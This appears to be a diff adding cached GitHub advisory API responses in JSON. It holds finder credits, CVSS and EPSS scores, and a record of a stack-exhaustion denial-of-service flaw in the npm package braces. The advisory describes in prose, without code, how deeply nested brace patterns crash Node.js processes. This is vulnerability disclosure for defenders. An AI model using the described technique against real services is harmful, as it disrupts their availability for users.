+              "following_url": "https://api.github.com/users/corbanvilla/following{/other_user}",
+              "gists_url": "https://api.github.com/users/corbanvilla/gists{/gist_id}",
+              "starred_url": "https://api.github.com/users/corbanvilla/starred{/owner}{/repo}",
+              "subscriptions_url": "https://api.github.com/users/corbanvilla/subscriptions",
+              "organizations_url": "https://api.github.com/users/corbanvilla/orgs",
+              "repos_url": "https://api.github.com/users/corbanvilla/repos",
+              "events_url": "https://api.github.com/users/corbanvilla/events{/privacy}",
+              "received_events_url": "https://api.github.com/users/corbanvilla/received_events",
+              "type": "User",
+              "user_view_type": "public",
+              "site_admin": false
+            },
+            "type": "finder"
+          },
+          {
+            "user": {
+              "login": "dderpym",
+              "id": 53957158,
+              "node_id": "MDQ6VXNlcjUzOTU3MTU4",
+              "avatar_url": "https://avatars.githubusercontent.com/u/53957158?v=4",
+              "gravatar_id": "",
+              "url": "https://api.github.com/users/dderpym",
+              "html_url": "https://github.com/dderpym",
+              "followers_url": "https://api.github.com/users/dderpym/followers",
+              "following_url": "https://api.github.com/users/dderpym/following{/other_user}",
+              "gists_url": "https://api.github.com/users/dderpym/gists{/gist_id}",
+              "starred_url": "https://api.github.com/users/dderpym/starred{/owner}{/repo}",
+              "subscriptions_url": "https://api.github.com/users/dderpym/subscriptions",
+              "organizations_url": "https://api.github.com/users/dderpym/orgs",
+              "repos_url": "https://api.github.com/users/dderpym/repos",
+              "events_url": "https://api.github.com/users/dderpym/events{/privacy}",
+              "received_events_url": "https://api.github.com/users/dderpym/received_events",
+              "type": "User",
+              "user_view_type": "public",
+              "site_admin": false
+            },
+            "type": "finder"
+          },
+          {
+            "user": {
+              "login": "sohcato",
+              "id": 92657104,
+              "node_id": "U_kgDOBYXV0A",
+              "avatar_url": "https://avatars.githubusercontent.com/u/92657104?v=4",
+              "gravatar_id": "",
+              "url": "https://api.github.com/users/sohcato",
+              "html_url": "https://github.com/sohcato",
+              "followers_url": "https://api.github.com/users/sohcato/followers",
+              "following_url": "https://api.github.com/users/sohcato/following{/other_user}",
+              "gists_url": "https://api.github.com/users/sohcato/gists{/gist_id}",
+              "starred_url": "https://api.github.com/users/sohcato/starred{/owner}{/repo}",
+              "subscriptions_url": "https://api.github.com/users/sohcato/subscriptions",
+              "organizations_url": "https://api.github.com/users/sohcato/orgs",
+              "repos_url": "https://api.github.com/users/sohcato/repos",
+              "events_url": "https://api.github.com/users/sohcato/events{/privacy}",
+              "received_events_url": "https://api.github.com/users/sohcato/received_events",
+              "type": "User",
+              "user_view_type": "public",
+              "site_admin": false
+            },
+            "type": "finder"
+          }
+        ],
+        "comments": 1,
+        "cvss": {
+          "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N",
+          "score": 7.5
+        },
+        "epss": {
+          "percentage": 0.00446,
+          "percentile": 0.36501
+        }
+      }
+    },
+    {
+      "id": "GHSA-vfj7-8cjw-p6xm",
+      "url": "https://api.github.com/advisories/GHSA-vfj7-8cjw-p6xm",
+      "observed_utc": "2026-10-21T04:20:10.722989+00:00",
+      "status": 200,
+      "response_sha256": "2ddb4a23a2b060e6b8b7c1a4dbf8693153be4ff8f5a2c478120ea6d8044c7bcb",
+      "response": {
+        "ghsa_id": "GHSA-vfj7-8cjw-p6xm",
+        "cve_id": "CVE-2026-93687",
+        "url": "https://api.github.com/advisories/GHSA-vfj7-8cjw-p6xm",
+        "html_url": "https://github.com/advisories/GHSA-vfj7-8cjw-p6xm",
+        "summary": "braces vulnerable to stack-exhaustion denial of service through deeply nested patterns",
+        "description": "braces through 3.0.3 contains a stack overflow vulnerability in the recursive AST walkers that lack depth guards. Attackers can supply deeply nested brace patterns under the character limit to exhaust the call stack and terminate the Node.js process with an uncaught RangeError.",
+        "type": "reviewed",
+        "severity": "high",
+        "repository_advisory_url": null,
+        "source_code_location": "https://github.com/micromatch/braces",
+        "identifiers": [
+          {
+            "value": "GHSA-vfj7-8cjw-p6xm",
+            "type": "GHSA"
+          },
+          {
+            "value": "CVE-2026-93687",
+            "type": "CVE"
+          }
+        ],
+        "references": [
+          "https://nvd.nist.gov/vuln/detail/CVE-2026-93687",
+          "https://github.com/micromatch/braces/issues/70",
+          "https://github.com/micromatch/braces/blob/3.0.3/lib/compile.js#L49-L53",
+          "https://github.com/micromatch/braces/blob/3.0.3/lib/expand.js#L102-L105",
+          "https://github.com/micromatch/braces/blob/3.0.3/lib/parse.js#L38-L40",
+          "https://www.vulncheck.com/advisories/braces-through-3.0.3-stack-overflow-via-deeply-nested-patterns",
+          "https://github.com/advisories/GHSA-vfj7-8cjw-p6xm"
+        ],
+        "published_at": "2026-09-18T18:31:41Z",
+        "updated_at": "2026-10-02T22:36:34Z",
+        "github_reviewed_at": "2026-10-02T22:36:33Z",
+        "nvd_published_at": "2026-09-18T16:17:15Z",
+        "withdrawn_at": null,
+        "vulnerabilities": [
+          {
+            "package": {
+              "ecosystem": "npm",
+              "name": "braces"
+            },
+            "vulnerable_version_range": "<= 3.0.3",
+            "first_patched_version": null,
+            "vulnerable_functions": []
+          }
+        ],
+        "cvss_severities": {
+          "cvss_v3": {
+            "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+            "score": 7.5
+          },
+          "cvss_v4": {
+            "vector_string": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N",
+            "score": 8.7
+          }
+        },
+        "cwes": [
+          {
+            "cwe_id": "CWE-674",
+            "name": "Uncontrolled Recursion"
+          }
+        ],
+        "credits": [],
+        "comments": 0,
+        "cvss": {
+          "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+          "score": 7.5
+        },
+        "epss": {
+          "percentage": 0.00757,
+          "percentile": 0.53919
+        }
+      }
+    }
+  ]
+}
